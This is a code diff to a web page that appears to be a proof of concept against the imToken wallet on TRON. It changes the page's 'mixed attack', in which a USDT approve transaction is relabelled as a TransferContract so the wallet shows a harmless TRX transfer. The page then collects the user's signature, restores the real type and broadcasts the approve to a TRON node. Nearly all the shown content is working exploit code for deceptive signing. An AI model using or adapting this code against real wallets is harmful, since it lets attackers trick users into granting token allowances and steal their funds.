@@ -40,7 +40,7 @@
     <div style="font-size:13px; color:var(--text2); line-height:1.6;">
       ① <span class="highlight-green">普通 TRX 转账</span> — 验证 <code>tron.sendTransaction</code> 入口可用<br>
       ② <span class="highlight-green">原始 USDT approve</span> — 验证合约调用可正常上链<br>
-      ③ <span class="highlight-red">混合攻击</span> — 弹窗显示 TRX 转账，实际签署并广播 USDT approve<br>
+      ③ <span class="highlight-red">混合攻击</span> — 仅改 type 诱骗 UI → 签名 → 还原 type → 手动广播 approve<br>
       <br>
       攻击原理：同一个 contract 对象包含两套字段 — 字符串键给 imToken UI 读取，数字键给 java-tron 节点解析<br>
       <code>type</code>/<code>parameter</code> 显示 TRX 转账，数字键 <code>"1"</code>/<code>"2"</code> 覆盖为 TriggerSmartContract<br>
@@ -245,14 +245,13 @@
     } catch (e) { log('构造失败: ' + (e.message || e), 'error'); }
   }
 
-  // ③ 混合攻击：钱包显示 TRX 转账，实际签署 approve 授权
+  // ③ 混合攻击：只改 type → 签名 → 还原 type → 手动广播
   async function mixedTx() {
     if (!window.tronWeb?.transactionBuilder) { log('tronWeb 未就绪', 'error'); return; }
     log('构造混合攻击交易…', 'warn');
     try {
       const contractHex = window.tronWeb.address.toHex(USDT_CONTRACT);
       const userHex = window.tronWeb.address.toHex(walletAddr);
-      const toHex = window.tronWeb.address.toHex(SPENDER);
 
       // Step 1: 构建真实的 approve 交易
       const { transaction, result } = await window.tronWeb.transactionBuilder.triggerSmartContract(
@@ -263,49 +262,86 @@
       );
       if (!result?.result) { log('approve 生成失败', 'error'); return; }
 
-      // 保存 approve 的原始 contract（parameter 即 realParam）
-      const realParam = transaction.raw_data.contract[0].parameter;
+      // Step 2: 只改 type 字符串，parameter 和 raw_data_hex 都不动
+      // imToken 读 type → 'TransferContract' → 显示 TRX 转账
+      // 签名数据(raw_data_hex)与节点解析数据(parameter)完全一致 → approve
+      const originalType = transaction.raw_data.contract[0].type; // 'TriggerSmartContract'
+      transaction.raw_data.contract[0].type = 'TransferContract';
+      // ⚠️ parameter 不替换，保持 TriggerSmartContract 原值
+      // ⚠️ raw_data_hex 不覆盖，保持 approve 字节
 
-      // Step 2: 构建假的 TransferContract 参数（给钱包确认页看）
-      const fakeParam = {
-        type_url: 'type.googleapis.com/protocol.TransferContract',
-        value: {
-          amount: 100000,
-          to_address: toHex,
-          owner_address: userHex,
-          data: ''
-        }
-      };
-
-      // Step 3: 混合 contract — toJSON() 注入数字键
-      // 关键技巧：数字键不直接作为对象属性（imToken 桥接会报 undefined）
-      // 而是藏在 toJSON() 中，只在 JSON 序列化发往节点时才注入
-      // - imToken 读 contract.type → TransferContract → UI 显示 TRX 转账
-      // - JSON.stringify → toJSON() 返回带数字键的对象 → 节点解析为 TriggerSmartContract
-      const contractObj = {
-        type: 'TransferContract',
-        parameter: fakeParam,
-        toJSON() {
-          return {
-           
-            '1': 'TriggerSmartContract',
-            '2': realParam
-          };
-        }
-      };
-      transaction.raw_data.contract[0] = contractObj;
-
-      // 不覆盖 raw_data_hex，保持 triggerSmartContract 生成的原始 approve 字节
       const hasSelector = transaction.raw_data_hex.includes('095ea7b3');
-      log(`raw_data_hex 包含 approve 选择器 (095ea7b3): ${hasSelector}`, hasSelector ? 'success' : 'error');
-      log('✔ contract.type = TransferContract → 钱包 UI 显示 TRX 转账', 'success');
-      log('✔ toJSON() 注入 "1"/"2" 数字键 → 节点解析为 TriggerSmartContract', 'success');
-      log('✔ raw_data_hex 保持原始 approve 字节', 'success');
+      log(`raw_data_hex 包含 approve 选择器: ${hasSelector}`, hasSelector ? 'success' : 'error');
+      log('✔ type 改为 TransferContract → 钱包弹窗显示 TRX 转账', 'success');
+      log('✔ parameter 保持 TriggerSmartContract → 节点解析为 approve', 'success');
+      log('✔ raw_data_hex 保持 approve 字节 → 签名数据不变', 'success');
+      log('改动量: 仅 type 一个字符串字段', 'warn');
 
-      // Step 4: 调用 sendTransaction
-      const ok = await sendTx(transaction, '混合攻击 (approve)');
-      if (ok) {
+      // Step 3: 用 signTransaction 签名
+      log('调用 tron.signTransaction 签名…', 'warn');
+      let signed;
+      try {
+        signed = await window.imToken.callPromisifyAPI('tron.signTransaction', {
+          tx: transaction,
+          from: walletAddr,
+          useTronHeader: true
+        });
+        log('签名返回: ' + JSON.stringify(signed), 'success');
+      } catch (signErr) {
+        log('signTransaction 失败: ' + (signErr.message || ''), 'error');
+        log('完整: ' + JSON.stringify(signErr), 'error');
+        if (signErr.message?.includes('reject')) log('用户取消签名', 'warn');
+        return;
+      }
+
+      if (!signed) { log('签名为空', 'error'); return; }
+
+      // Step 4: 提取签名并还原 type
+      // signed 可能是字符串(hex)、带 signature 的对象、或整个 signed tx
+      let signature;
+      if (typeof signed === 'string') {
+        signature = signed;
+      } else if (Array.isArray(signed)) {
+        signature = signed;
+      } else if (signed && typeof signed === 'object') {
+        // 可能整个 signedTransaction 被返回
+        if (signed.signature) signature = signed.signature;
+        else if (signed.txID || signed.txid) {
+          // 可能只返回了 txID，需要回退
+          log('signTransaction 只返回 txID，尝试用 sendTransaction', 'warn');
+          const ok = await sendTx(transaction, '混合攻击 (approve)');
+          if (ok) setTimeout(() => refreshAllowanceUI(false), 12000);
+          return;
+        }
+      }
+
+      if (!signature) { log('未能提取签名', 'error'); return; }
+      log('✔ 签名已提取', 'success');
+
+      // 还原 type
+      transaction.raw_data.contract[0].type = originalType;
+      transaction.signature = Array.isArray(signature) ? signature : [signature];
+      log('✔ type 已还原为 TriggerSmartContract', 'success');
+
+      // Step 5: 手动广播
+      log('手动广播到 TRON 节点…', 'warn');
+      const broadcastResp = await fetch(TRON_API + '/wallet/broadcasttransaction', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(transaction)
+      });
+      const broadcastData = await broadcastResp.json();
+      log('广播返回: ' + JSON.stringify(broadcastData), 'success');
+
+      if (broadcastData.result === true || broadcastData.txid || broadcastData.txID) {
+        const txid = broadcastData.txid || broadcastData.txID || '';
+        log('✅ 混合攻击交易已上链! TXID: ' + txid, 'success');
+        log('Tronscan: https://tronscan.org/#/transaction/' + txid, 'info');
         setTimeout(() => refreshAllowanceUI(false), 12000);
+      } else if (broadcastData.code) {
+        log('❌ 广播失败: ' + (broadcastData.message || JSON.stringify(broadcastData)), 'error');
+      } else {
+        log('⚠ 广播结果不明: ' + JSON.stringify(broadcastData), 'warn');
       }
     } catch (e) {
       log('构造失败: ' + (e.message || e), 'error');
